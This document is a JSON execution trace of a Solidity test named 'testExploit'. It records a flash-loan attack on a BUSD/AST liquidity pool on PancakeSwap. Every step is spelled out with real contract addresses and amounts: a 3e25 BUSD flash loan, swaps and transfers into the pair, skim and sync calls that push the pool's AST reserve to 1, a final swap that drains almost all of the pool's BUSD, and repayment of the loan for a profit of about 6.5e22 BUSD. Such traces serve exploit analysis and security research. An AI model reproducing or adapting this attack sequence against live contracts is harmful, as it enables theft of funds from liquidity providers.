{
  "logs": {
    "calls": [
      {
        "id": "415247",
        "contract": "ContractTest",
        "function": "testExploit",
        "args": "",
        "return_value": "Returned",
        "depth": 0,
        "internal_calls": [
          {
            "id": "2531",
            "contract": "BUSD",
            "function": "balanceOf",
            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
            "return_value": "1000000000000000000 [1e18]",
            "depth": 1,
            "internal_calls": [],
            "value": null
          },
          {
            "id": "396291",
            "contract": "PancakePool",
            "function": "flash",
            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 30000000000000000000000000 [3e25], 0, 0x00000000000000000000000000000000000000000018d0bf423c03d8de000000",
            "return_value": "Returned",
            "depth": 1,
            "internal_calls": [
              {
                "id": "2531",
                "contract": "BUSD",
                "function": "balanceOf",
                "args": "PancakePool: [0x36696169C63e42cd08ce11f5deeBbCeBae652050]",
                "return_value": "45653978301454109570680035 [4.565e25]",
                "depth": 2,
                "internal_calls": []
              },
              {
                "id": "2534",
                "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                "function": "balanceOf",
                "args": "PancakePool: [0x36696169C63e42cd08ce11f5deeBbCeBae652050]",
                "return_value": "10174523019143306513145 [1.017e22]",
                "depth": 2,
                "internal_calls": []
              },
              {
                "id": "8871",
                "contract": "BUSD",
                "function": "transfer",
                "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 30000000000000000000000000 [3e25]",
                "return_value": "true",
                "depth": 2,
                "internal_calls": []
              },
              {
                "id": "351521",
                "contract": "ContractTest",
                "function": "pancakeV3FlashCallback",
                "args": "15000000000000000000000 [1.5e22], 0, 0x00000000000000000000000000000000000000000018d0bf423c03d8de000000",
                "return_value": "Returned",
                "depth": 2,
                "internal_calls": [
                  {
                    "id": "531",
                    "contract": "BUSD",
                    "function": "balanceOf",
                    "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                    "return_value": "30000001000000000000000000 [3e25]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "24562",
                    "contract": "BUSD",
                    "function": "approve",
                    "args": "pancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                    "return_value": "true",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "24663",
                    "contract": "AST",
                    "function": "approve",
                    "args": "pancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                    "return_value": "true",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "24598",
                    "contract": "BUSD_AST_LPPool",
                    "function": "approve",
                    "args": "pancakeRouter: [0x10ED43C718714eb63d5aA57B78B54704E256024E], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]",
                    "return_value": "true",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "90928",
                    "contract": "pancakeRouter",
                    "function": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
                    "args": "30000000000000000000000000 [3e25], 0, [0x55d398326f99059fF775485246999027B3197955, 0xc10E0319337c7F83342424Df72e73a70A29579B2], ERC1967Proxy: [0xc8B9817eB65B7d7e85325f23A60D5839d14F9Ce4], 1737475209 [1.737e9]",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": [
                      {
                        "id": "10834",
                        "contract": "BUSD",
                        "function": "transferFrom",
                        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a], 30000000000000000000000000 [3e25]",
                        "return_value": "true",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "2617",
                        "contract": "AST",
                        "function": "balanceOf",
                        "args": "ERC1967Proxy: [0xc8B9817eB65B7d7e85325f23A60D5839d14F9Ce4]",
                        "return_value": "999943479132860518455 [9.999e20]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "2893",
                        "contract": "BUSD_AST_LPPool",
                        "function": "getReserves",
                        "args": "",
                        "return_value": "80145197852789777147003 [8.014e22], 2504016689690289439489 [2.504e21], 1737475164 [1.737e9]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "531",
                        "contract": "BUSD",
                        "function": "balanceOf",
                        "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                        "return_value": "30080145197852789777147003 [3.008e25]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "66294",
                        "contract": "BUSD_AST_LPPool",
                        "function": "swap",
                        "args": "0, 2497328339685694985988 [2.497e21], ERC1967Proxy: [0xc8B9817eB65B7d7e85325f23A60D5839d14F9Ce4], 0x",
                        "return_value": "Returned",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "31834",
                            "contract": "AST",
                            "function": "transfer",
                            "args": "ERC1967Proxy: [0xc8B9817eB65B7d7e85325f23A60D5839d14F9Ce4], 2497328339685694985988 [2.497e21]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": [
                              {
                                "id": "531",
                                "contract": "BUSD",
                                "function": "balanceOf",
                                "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                                "return_value": "30080145197852789777147003 [3.008e25]",
                                "depth": 6,
                                "internal_calls": []
                              }
                            ]
                          },
                          {
                            "id": "531",
                            "contract": "BUSD",
                            "function": "balanceOf",
                            "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                            "return_value": "30080145197852789777147003 [3.008e25]",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "617",
                            "contract": "AST",
                            "function": "balanceOf",
                            "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                            "return_value": "6688350004594453501 [6.688e18]",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "617",
                        "contract": "AST",
                        "function": "balanceOf",
                        "args": "ERC1967Proxy: [0xc8B9817eB65B7d7e85325f23A60D5839d14F9Ce4]",
                        "return_value": "3497271818818555504443 [3.497e21]",
                        "depth": 4,
                        "internal_calls": []
                      }
                    ]
                  },
                  {
                    "id": "617",
                    "contract": "AST",
                    "function": "balanceOf",
                    "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                    "return_value": "6688350004594453501 [6.688e18]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "6071",
                    "contract": "BUSD",
                    "function": "transfer",
                    "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a], 1000000000000000000 [1e18]",
                    "return_value": "true",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "44212",
                    "contract": "AST",
                    "function": "transfer",
                    "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a], 6688350004594453500 [6.688e18]",
                    "return_value": "true",
                    "depth": 3,
                    "internal_calls": [
                      {
                        "id": "531",
                        "contract": "BUSD",
                        "function": "balanceOf",
                        "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                        "return_value": "30080146197852789777147003 [3.008e25]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "2439",
                        "contract": "BUSD_AST_LPPool",
                        "function": "totalSupply",
                        "args": "",
                        "return_value": "14142135553020272192585 [1.414e22]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "531",
                        "contract": "BUSD",
                        "function": "balanceOf",
                        "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                        "return_value": "30080146197852789777147003 [3.008e25]",
                        "depth": 4,
                        "internal_calls": []
                      }
                    ]
                  },
                  {
                    "id": "34852",
                    "contract": "BUSD_AST_LPPool",
                    "function": "skim",
                    "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": [
                      {
                        "id": "531",
                        "contract": "BUSD",
                        "function": "balanceOf",
                        "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                        "return_value": "30080146197852789777147003 [3.008e25]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "3271",
                        "contract": "BUSD",
                        "function": "transfer",
                        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000 [1e18]",
                        "return_value": "true",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "617",
                        "contract": "AST",
                        "function": "balanceOf",
                        "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                        "return_value": "13376700009188907001 [1.337e19]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "22966",
                        "contract": "AST",
                        "function": "transfer",
                        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6688350004594453500 [6.688e18]",
                        "return_value": "true",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "2537",
                            "contract": "BUSD_AST_LPPool",
                            "function": "balanceOf",
                            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                            "return_value": "0",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "531",
                            "contract": "BUSD",
                            "function": "balanceOf",
                            "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                            "return_value": "30080145197852789777147003 [3.008e25]",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "9060",
                    "contract": "BUSD_AST_LPPool",
                    "function": "sync",
                    "args": "",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": [
                      {
                        "id": "531",
                        "contract": "BUSD",
                        "function": "balanceOf",
                        "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                        "return_value": "30080145197852789777147003 [3.008e25]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "617",
                        "contract": "AST",
                        "function": "balanceOf",
                        "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                        "return_value": "1",
                        "depth": 4,
                        "internal_calls": []
                      }
                    ]
                  },
                  {
                    "id": "531",
                    "contract": "BUSD",
                    "function": "balanceOf",
                    "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                    "return_value": "30080145197852789777147003 [3.008e25]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "617",
                    "contract": "AST",
                    "function": "balanceOf",
                    "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                    "return_value": "1",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "617",
                    "contract": "AST",
                    "function": "balanceOf",
                    "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                    "return_value": "311649995405546500 [3.116e17]",
                    "depth": 3,
                    "internal_calls": []
                  },
                  {
                    "id": "51372",
                    "contract": "pancakeRouter",
                    "function": "swapExactTokensForTokensSupportingFeeOnTransferTokens",
                    "args": "311649995405546500 [3.116e17], 0, [0xc10E0319337c7F83342424Df72e73a70A29579B2, 0x55d398326f99059fF775485246999027B3197955], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1737475209 [1.737e9]",
                    "return_value": "Returned",
                    "depth": 3,
                    "internal_calls": [
                      {
                        "id": "20361",
                        "contract": "AST",
                        "function": "transferFrom",
                        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a], 311649995405546500 [3.116e17]",
                        "return_value": "true",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "531",
                            "contract": "BUSD",
                            "function": "balanceOf",
                            "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                            "return_value": "30080145197852789777147003 [3.008e25]",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "531",
                            "contract": "BUSD",
                            "function": "balanceOf",
                            "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                            "return_value": "30080145197852789777147003 [3.008e25]",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "531",
                        "contract": "BUSD",
                        "function": "balanceOf",
                        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                        "return_value": "1000000000000000000 [1e18]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "893",
                        "contract": "BUSD_AST_LPPool",
                        "function": "getReserves",
                        "args": "",
                        "return_value": "30080145197852789777147003 [3.008e25], 1, 1737475209 [1.737e9]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "617",
                        "contract": "AST",
                        "function": "balanceOf",
                        "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                        "return_value": "299087995589324641 [2.99e17]",
                        "depth": 4,
                        "internal_calls": []
                      },
                      {
                        "id": "21247",
                        "contract": "BUSD_AST_LPPool",
                        "function": "swap",
                        "args": "30080145197852789676322046 [3.008e25], 0, ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x",
                        "return_value": "Returned",
                        "depth": 4,
                        "internal_calls": [
                          {
                            "id": "6071",
                            "contract": "BUSD",
                            "function": "transfer",
                            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 30080145197852789676322046 [3.008e25]",
                            "return_value": "true",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "531",
                            "contract": "BUSD",
                            "function": "balanceOf",
                            "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                            "return_value": "100824957 [1.008e8]",
                            "depth": 5,
                            "internal_calls": []
                          },
                          {
                            "id": "617",
                            "contract": "AST",
                            "function": "balanceOf",
                            "args": "BUSD_AST_LPPool: [0x5ffEc8523A42BE78B1Ad1244fA526f14B64bA47a]",
                            "return_value": "299087995589324641 [2.99e17]",
                            "depth": 5,
                            "internal_calls": []
                          }
                        ]
                      },
                      {
                        "id": "531",
                        "contract": "BUSD",
                        "function": "balanceOf",
                        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
                        "return_value": "30080146197852789676322046 [3.008e25]",
                        "depth": 4,
                        "internal_calls": []
                      }
                    ]
                  },
                  {
                    "id": "3271",
                    "contract": "BUSD",
                    "function": "transfer",
                    "args": "PancakePool: [0x36696169C63e42cd08ce11f5deeBbCeBae652050], 30015000000000000000000000 [3.001e25]",
                    "return_value": "true",
                    "depth": 3,
                    "internal_calls": []
                  }
                ]
              },
              {
                "id": "531",
                "contract": "BUSD",
                "function": "balanceOf",
                "args": "PancakePool: [0x36696169C63e42cd08ce11f5deeBbCeBae652050]",
                "return_value": "45668978301454109570680035 [4.566e25]",
                "depth": 2,
                "internal_calls": []
              },
              {
                "id": "534",
                "contract": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
                "function": "balanceOf",
                "args": "PancakePool: [0x36696169C63e42cd08ce11f5deeBbCeBae652050]",
                "return_value": "10174523019143306513145 [1.017e22]",
                "depth": 2,
                "internal_calls": []
              }
            ],
            "value": null
          },
          {
            "id": "531",
            "contract": "BUSD",
            "function": "balanceOf",
            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
            "return_value": "65146197852789676322046 [6.514e22]",
            "depth": 1,
            "internal_calls": [],
            "value": null
          }
        ],
        "value": null
      }
    ]
  }
}